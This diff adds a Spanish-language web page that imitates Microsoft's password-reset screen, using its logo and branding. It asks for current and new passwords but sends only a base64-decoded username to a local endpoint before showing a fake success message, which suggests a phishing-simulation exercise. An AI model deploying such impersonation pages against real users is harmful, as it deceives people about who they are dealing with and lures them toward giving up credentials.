@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Restablecer la contraseña</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: linear-gradient(135deg, #f5c6c6 0%, #e8d5e8 25%, #d0e8d8 60%, #c8ddd8 100%);
+      position: relative;
+    }
+
+    .footer {
+      position: fixed;
+      bottom: 16px;
+      right: 20px;
+      display: flex;
+      gap: 16px;
+      font-size: 12px;
+      color: #444;
+    }
+
+    .footer a {
+      text-decoration: none;
+      color: #444;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    .card {
+      background: #ffffff;
+      border-radius: 2px;
+      padding: 44px 44px 36px 44px;
+      width: 440px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.12);
+    }
+
+    .ms-logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    .ms-logo .grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1px;
+      width: 20px;
+      height: 20px;
+    }
+
+    .ms-logo .grid span {
+      display: block;
+      width: 11px;
+      height: 11px;
+    }
+
+    .ms-logo .grid span:nth-child(1) { background: #f25022; }
+    .ms-logo .grid span:nth-child(2) { background: #7fba00; }
+    .ms-logo .grid span:nth-child(3) { background: #00a4ef; }
+    .ms-logo .grid span:nth-child(4) { background: #ffb900; }
+
+    .ms-logo span.brand {
+      font-size: 21px;
+      color: #737373;
+      font-weight: 600;
+      letter-spacing: -0.2px;
+    }
+
+    h1 {
+      font-size: 23px;
+      font-weight: 600;
+      color: #1b1b1b;
+      margin-bottom: 6px;
+      letter-spacing: -0.3px;
+    }
+
+    .subtitle {
+      font-size: 13px;
+      color: #444;
+      margin-bottom: 28px;
+    }
+
+    .account-display {
+      font-size: 13px;
+      color: #1b1b1b;
+      margin-bottom: 24px;
+      padding: 8px 10px;
+      background: #f2f2f2;
+      border-left: 3px solid #0067b8;
+    }
+
+    .input-group {
+      margin-bottom: 18px;
+      position: relative;
+    }
+
+    .input-group label {
+      display: block;
+      font-size: 13px;
+      color: #1b1b1b;
+      margin-bottom: 4px;
+    }
+
+    .input-group input {
+      width: 100%;
+      border: none;
+      border-bottom: 1px solid #666;
+      outline: none;
+      font-size: 15px;
+      font-family: inherit;
+      color: #1b1b1b;
+      padding: 6px 0 6px 0;
+      background: transparent;
+      transition: border-color 0.15s;
+    }
+
+    .input-group input::placeholder {
+      color: #666;
+      font-size: 15px;
+    }
+
+    .input-group input:focus {
+      border-bottom: 2px solid #0067b8;
+    }
+
+    .input-group input:focus + .focus-line {
+      transform: scaleX(1);
+    }
+
+    .field-error {
+      display: none;
+      font-size: 12px;
+      color: #d00000;
+      margin-bottom: 4px;
+    }
+
+    .field-error.visible {
+      display: block;
+    }
+
+    .actions {
+      display: flex;
+      justify-content: flex-end;
+      gap: 8px;
+      margin-top: 8px;
+    }
+
+    .btn {
+      font-family: inherit;
+      font-size: 14px;
+      font-weight: 400;
+      padding: 7px 20px;
+      border-radius: 0;
+      cursor: pointer;
+      border: 1px solid transparent;
+      transition: background 0.1s, border-color 0.1s;
+    }
+
+    .btn-secondary {
+      background: #e6e6e6;
+      color: #1b1b1b;
+      border-color: #e6e6e6;
+    }
+
+    .btn-secondary:hover {
+      background: #d0d0d0;
+      border-color: #d0d0d0;
+    }
+
+    .btn-primary {
+      background: #0067b8;
+      color: #fff;
+      border-color: #0067b8;
+    }
+
+    .btn-primary:hover {
+      background: #005fa3;
+      border-color: #005fa3;
+    }
+    .success-view {
+      display: none;
+      padding: 4px 0 8px;
+    }
+
+    .success-title {
+      font-size: 23px;
+      font-weight: 600;
+      color: #1b1b1b;
+      margin-bottom: 12px;
+      letter-spacing: -0.3px;
+    }
+
+    .success-text {
+      font-size: 13px;
+      color: #444;
+      line-height: 1.6;
+      margin-bottom: 8px;
+    }
+
+    .success-account {
+      font-size: 13px;
+      color: #1b1b1b;
+      font-weight: 600;
+      margin-bottom: 28px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="ms-logo">
+      <div class="grid">
+        <span></span><span></span>
+        <span></span><span></span>
+      </div>
+      <span class="brand">Microsoft</span>
+    </div>
+
+    <h1>Restablecer la contraseña</h1>
+    <p class="subtitle">Introduce una contraseña nueva. Las contraseñas distinguen entre mayúsculas y minúsculas y deben tener un mínimo de 8&nbsp;caracteres.</p>
+
+    <div class="account-display" id="account-label"></div>
+
+    <div id="msg"></div>
+
+    <!-- Formulario -->
+    <div id="form-view">
+      <div class="input-group">
+        <label for="currentPassword">Contraseña actual</label>
+        <div class="field-error" id="err-current">Ingresa tu contraseña actual.</div>
+        <input id="currentPassword" type="password" placeholder="" autocomplete="current-password" />
+      </div>
+
+      <div class="input-group">
+        <label for="newPassword">Nueva contraseña</label>
+        <div class="field-error" id="err-new">Mínimo 8 caracteres.</div>
+        <input id="newPassword" type="password" placeholder="" autocomplete="new-password" />
+      </div>
+
+      <div class="input-group">
+        <label for="confirmPassword">Vuelve a escribir la contraseña nueva</label>
+        <div class="field-error" id="err-confirm">Las contraseñas no coinciden.</div>
+        <input id="confirmPassword" type="password" placeholder="" autocomplete="new-password" />
+      </div>
+
+      <div class="actions">
+        <button id="btnCancel" class="btn btn-secondary">Cancelar</button>
+        <button id="btnSubmit" class="btn btn-primary">Siguiente</button>
+      </div>
+    </div>
+
+    <!-- Pantalla de éxito -->
+    <div id="success-view" class="success-view">
+      <p class="success-title">Tu contraseña se actualizó</p>
+      <p class="success-text">La información de seguridad de tu cuenta ha sido actualizada correctamente.</p>
+      <p class="success-account" id="success-username"></p>
+      <p class="success-text">Ya puedes usar tu nueva contraseña para iniciar sesión en todos los servicios de Microsoft.</p>
+      <div class="actions">
+        <a href="https://outlook.office365.com" class="btn btn-primary" style="text-decoration:none;">Iniciar sesión</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer">
+    <a href="#">Términos de uso</a>
+    <a href="#">Privacidad y cookies</a>
+  </div>
+
+  <script>
+    const rawUsername = new URLSearchParams(window.location.search).get("username");
+    const username = rawUsername ? atob(rawUsername) : null;
+    const accountLabel = document.getElementById("account-label");
+    if (username && accountLabel) accountLabel.textContent = username;
+
+    function showError(id, visible) {
+      document.getElementById(id).classList.toggle("visible", visible);
+    }
+
+    function validate(current, nuevo, confirm) {
+      let valid = true;
+      showError("err-current", !current);  if (!current) valid = false;
+      showError("err-new", nuevo.length < 8); if (nuevo.length < 8) valid = false;
+      showError("err-confirm", nuevo !== confirm); if (nuevo !== confirm) valid = false;
+      return valid;
+    }
+
+    function showSuccess() {
+      document.getElementById("form-view").style.display = "none";
+      document.querySelector(".subtitle").style.display = "none";
+      document.getElementById("account-label").style.display = "none";
+      document.querySelector("h1").style.display = "none";
+      const el = document.getElementById("success-username");
+      if (el && username) el.textContent = username;
+      document.getElementById("success-view").style.display = "block";
+    }
+
+    document.getElementById("btnSubmit").addEventListener("click", async () => {
+      const currentPassword = document.getElementById("currentPassword").value;
+      const newPassword     = document.getElementById("newPassword").value;
+      const confirmPassword = document.getElementById("confirmPassword").value;
+
+      if (!validate(currentPassword, newPassword, confirmPassword)) return;
+
+      try {
+        const res = await fetch("/api/reset-password", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ username }),
+        });
+        const data = await res.json();
+        if (res.ok) {
+          showSuccess();
+        } else {
+          alert(data.error || "Ocurrió un error. Inténtalo nuevamente.");
+        }
+      } catch (err) {
+        alert("Error de conexión. Inténtalo nuevamente.");
+      }
+    });
+
+    document.getElementById("btnCancel").addEventListener("click", () => history.back());
+  </script>
+</body>
+</html>
